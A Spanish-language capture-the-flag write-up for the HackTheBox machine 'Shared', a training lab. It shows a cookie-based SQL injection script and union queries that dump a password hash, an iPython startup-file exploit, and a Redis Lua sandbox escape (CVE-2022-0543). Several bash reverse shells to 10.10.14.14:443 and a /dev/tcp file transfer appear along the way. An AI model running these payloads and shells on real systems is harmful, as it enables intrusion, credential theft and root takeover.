Write Up de la maquina shared de la plataforma de HackTheBox, una maquina de dificultad Media.

![](/assets/img/shared/shared.png)

## Enumeracion

Empezemos Detectando los puertos que estan abiertos en la maquina victima.
```bash
❯ nmap 10.10.11.172
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 17:20 -05
Nmap scan report for shared.htb (10.10.11.172)
Host is up (0.098s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 3.66 seconds
```
Detectemos la version que corre para estos puertos.
```bash
❯ nmap -sCV -p22,80,443 10.10.11.172 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 17:22 -05
Nmap scan report for 10.10.11.172
Host is up (0.096s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91e835f4695fc2e20e2746e2a6b6d865 (RSA)
|   256 cffcc45d84fb580bbe2dad35409dc351 (ECDSA)
|_  256 a3386d750964ed70cf17499adc126d11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-nextprotoneg: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.44 seconds
```
En el puerto 80 hay un redirect hacia el dominio shared.htb por lo que tenemos que agregar este dominio al /etc/hosts.
```bash
❯ echo '10.10.11.172 shared.htb' >> /etc/hosts
```
Veamos como se ve la pagina web.

![](/assets/img/shared/web.png)

En la sección de accesorios vemos algunos productos.

![](/assets/img/shared/aces.png)

Si le damos clip en cualquier accessorio nos lleva a esta parte de la web.

![](/assets/img/shared/cart.png)

Le damos a agregar al carro y aqui le damos en pasar por la caja.

![](/assets/img/shared/caja.png)

Se agrega correctamente al carro y nos lleva a esta sección en la cual podemos proceder con el pago.

![](/assets/img/shared/shop.png)

Si le damos a proceder con el pago nos lleva a un subdominio el cual no sabe a que resolver.

![](/assets/img/shared/sub.png)

Agregemos este subdominio al /etc/hosts

```bash
❯ echo '10.10.11.172 checkout.shared.htb' >> /etc/hosts
```
Recargamos la pagina y ahora si vemos el subdominio, el subdominio es un validador de targetas de credito.
![](/assets/img/shared/check.png)
En este subdominio si ingresamos cualquier dato nos muestra siempre el mismo mensaje

![](/assets/img/shared/pay.png)

En la parte de proceder con el pago voy a interceptar la peticion usando burpsuite.

![](/assets/img/shared/bu.png)

Intercepto la peticion con burpsuite y vemos esto.

![](/assets/img/shared/bu2.png)

Si urldecodiamos la cookie de custom_cart el valor de este es el que nos muestra la web.

![](/assets/img/shared/bu3.png)

Si le agregamos una ' al campo de la cookie nos dice not found.

![](/assets/img/shared/bu4.png)

Si agregamos un comentario al resto de la query el valor vuelve aparecer.
![](/assets/img/shared/bu5.png)

## SQL Injection
Este campo es vulnerable a SQL Injection voy a crear un script de python atraves del cual poder dumpear todos los datos que me interesen.

```python
#!/bin/bash

import signal, sys, requests, pdb, re

def ctrl_c(sig, frame):

    print("\n\n[!] Saliendo.\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables
url = 'http://checkout.shared.htb'
burp = {"http":"http://127.0.0.1:8080"}

def makeRequest(query):
    
    data = ''

    cookies = {
            "custom_cart":"""{"%s":"1"}""" % query
            }
 
    r = requests.get(url,cookies=cookies)
    
    return r.text

if __name__ == "__main__":
    
    query = ''
 
    while query != 'exit':     
        
        query = input('> ')
        
        send = makeRequest(query)
    
        output = re.findall("<td>(.*?)</td>", send)[0]
        
        print(output)

        print()
```        
Ejecutamos el script usando rlwrap para poder tener historico y poder movernos mas comodos.
```bash
❯ rlwrap python3 sqlI.py
BTAPXNX4' and 1=1-- -
BTAPXNX4
```
Nos devuelve el valor por que la consulta esta correcta, si le indicamos una query incorrecta nos va a decir not found.
```bash
> BTAPXNX4' and 2=1-- -
Not Found
```
Teniendo esto claro podemos ver cual es el numero de columnas que hay en la tabla que se esta utilizando actualmente, podemos saber cual es el numero de columnas usando order by.
```bash
> BTAPXNX4' order by 100-- -
Not Found

> BTAPXNX4' order by 3-- -
BTAPXNX4

> BTAPXNX4' order by 4-- -
Not Found
```
Podemos ver que hay 3 columnas, sabiendo el numero de columnas podemos aplicar un union select para selecionar las 3 columnas.
```bash
> ' union select 1,2,3-- -
2
```
Ese numero 2 que nos devuelve es el numero 2 de nuestra seleccion, si le indicamos test por ejemplo nos delvuelve ese valor.
```bash
' union select 1,'test',3-- -
test
```
Vale atraves del numero 2 podemos dumpear todos los datos que nos interesen por ejemplo veamos cual es el nombre de la base de datos actualmente en uso.
```bash
> ' union select 1,database(),3-- -
checkout
```
Veamos cuales son los nombres de todas las bases de datos que existen.
```bash
> ' union select 1,schema_name,3 from information_schema.schemata-- -
information_schema
```
Nos devuelve un solo valor por que no es capas de incluir los demas resultados para poder ver todos los valores podemos usar group_concat().
```bash
> ' union select 1,group_concat(schema_name),3 from information_schema.schemata-- -
information_schema,checkout
```
Solo hay dos bases de datos enumeremos las tablas de la base de datos checkout.
```bash
> ' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='checkout'-- -
user,product
```
Enumeremos las columnas de la tabla user.
```bash
> ' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='checkout' and table_name='user'-- -
id,username,password
```
Ahora simplemente veamos el contenido de estas columnas, voy a usar group_concat() para poder ver todos los datos juntos y 0x3a para que me separe cada campo con ":" puntos.
```bash
> ' union select 1,group_concat(username,0x3a,password),3 from user-- -
james_mason:fc895d4eddc2fc12f995e18c865cf273
```
Obtenemos un usuario y una contraseña en md5, este hash lo podemos intentar romper en [Crackstation](https://crackstation.net/).
![](/assets/img/shared/hash.png)

Obtenemos la contraseña en texto claro.
## Intrusion
Podemos usar estas credenciales para conectarnos por ssh.
```bash
❯ sshpass -p 'Soleil101' ssh james_mason@10.10.11.172
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
james_mason@shared:~$ 
```
Si hacemos un id veremos que estamos en el grupo developer.
```bash
james_mason@shared:/tmp/enum$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```
Si buscamos archivos y directorios que pertenezcan al grupo developer, encontramos un directorio.
```bash
james_mason@shared:/$ find / -group developer 2>/dev/null 
/opt/scripts_review
```
Si listamos los permisos del directorio, el grupo developer tiene capacidad de escritura en este directorio.
```bash
james_mason@shared:/$ ls -ld /opt/scripts_review
drwxrwx--- 2 root developer 4096 Jul 14  2022 /opt/scripts_review
james_mason@shared:/$ 
```
Si vemos el contenido del directorio no hay nada por lo que es un poco extraño.
```bash
james_mason@shared:/$ ls -la /opt/scripts_review
total 8
drwxrwx--- 2 root developer 4096 Jul 14  2022 .
drwxr-xr-x 3 root root      4096 Jul 14  2022 ..
james_mason@shared:/$
```
## Movimiento Lateral
Para enumerar todos los comandos que se esten ejecutando a nivel de sistema voy a estar utilizando [pspy64](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1).

Si lo dejamos corriendo unos minutos veremos que hay una tarea cron que se ejecuta cada sierto tiempo.
![](/assets/img/shared/cron.png)

La tarea esta matando todos los processos de ipython y se esta metiendo al directorio /opt/scripts_review (en el cual tenemos capacidad de escritura) y desde este directorio esta ejecutando el ipython, veamos la version del ipython.
```bash
james_mason@shared:/$ ipython --version
8.0.0
```
Buscando vulnerabilidades de ipython me encontre con este [articulo](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) en el cual explican que al momento de ejecutar el ipython podemos colar un comando.

Podemos comprobar que funciona ejecutando un whoami y metiendo el ouput a un archivo.
```bash
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default && mkdir -m 777 profile_default/startup && echo "import os;os.system('whoami > /tmp/quiensoy')" > profile_default/startup/foo.py
```bash
james_mason@shared:/opt/scripts_review$ cat /tmp/quiensoy
dan_smith
```
Funciona por lo que podemos enviarnos una shell interactiva.
```bash
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default && mkdir -m 777 profile_default/startup && echo "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.14/443 0>&1\"')" > profile_default/startup/foo.py
```
Despues de unos minutos nos llega la consola.
```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.172] 33764
bash: cannot set terminal process group (3434): Inappropriate ioctl for device
bash: no job control in this shell
dan_smith@shared:/opt/scripts_review$ id
id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
dan_smith@shared:/opt/scripts_review$ 
```
## Escalada de Privilegios
Si buscamos nuevamente por archivos del nuevo grupo en el que estamos, encontramos uno.
```bash
dan_smith@shared:/$ find / -group sysadmin 2>/dev/null 
/usr/local/bin/redis_connector_dev
dan_smith@shared:/$ 
```
Lo ejecutamos y vemos que se conecta a redis.
```bash
dan_smith@shared:/$ /usr/local/bin/redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:4974
run_id:73bf38fb1b5660f7627ed2cb22636e02821f6afa
tcp_port:6379
uptime_in_seconds:37
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:6736143
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
dan_smith@shared:/$ 
```
por lo que posiblemente se este autenticando, podemos intetar conectarnos con redis-cli para comprobar si nos pide autenticacion.
```bash
dan_smith@shared:/$ redis-cli 
127.0.0.1:6379> INFO
NOAUTH Authentication required.
127.0.0.1:6379> 
```
Nos pide que estemos autenticados por lo que el script de arriba se debe estar autenticandose, me voy a transferir este archivo a mi maquina.
```bash
dan_smith@shared:/$ cat /usr/local/bin/redis_connector_dev > /dev/tcp/10.10.14.14/443 0>&1
```
Recibo el archivo
```bash
❯ nc -lvnp 443 > redisc_conector_dev
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.172] 46438
```
Con nc nos podemos poner en escucha por el puerto de redis 6379 y ejecutar el script para ver que es lo que hace.
```bash
❯ nc -lvnp 6379
```
Le damos permisos de ejecuccion y lo ejecutamos.
```bash
❯ chmod +x redisc_conector_dev
❯ ./redisc_conector_dev
[+] Logging to redis instance using password...

INFO command result:
 i/o timeout
 ```
 Se conecta a nuestro puerto 6379 y podemos ver con que contraseña se esta autenticando.
 ```bash
 ❯ nc -lvnp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 46420
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```
Comprobemos que estas credenciales sean correctos.
```bash
dan_smith@shared:/$ redis-cli 
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> 
```
Y la contraseña es correcta, Si nos vamos a [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass) y filtramos por redis nos hablan de que podemos llegar a injectar comandos ya que en redis se usa Eval para ejecutar codigo lua.

En este [articulo](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/) explican muy bien de que va la vulnerabilidad y de que forma aprovecharnos de esta.

Creamos un archivo el cual se encargue de enviarnos una ReverShell.
```bash
dan_smith@shared:/dev/shm$ cat rev.sh 
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.14/443 0>&1" & disown
```
Nos conectamos a redis y ejecutamos los Siguientes comandos.
```bash
 dan_smith@shared:/dev/shm$ redis-cli 
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash /dev/shm/rev.sh", "r"); local res = f:read("*a"); f:close(); return res' 0
```
Y Por debajo nos llega la consola como root
```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.172] 52222
bash: cannot set terminal process group (4527): Inappropriate ioctl for device
bash: no job control in this shell
root@shared:/var/lib/redis# whoami
whoami
root
root@shared:/var/lib/redis# 
```
Gracias por leer!
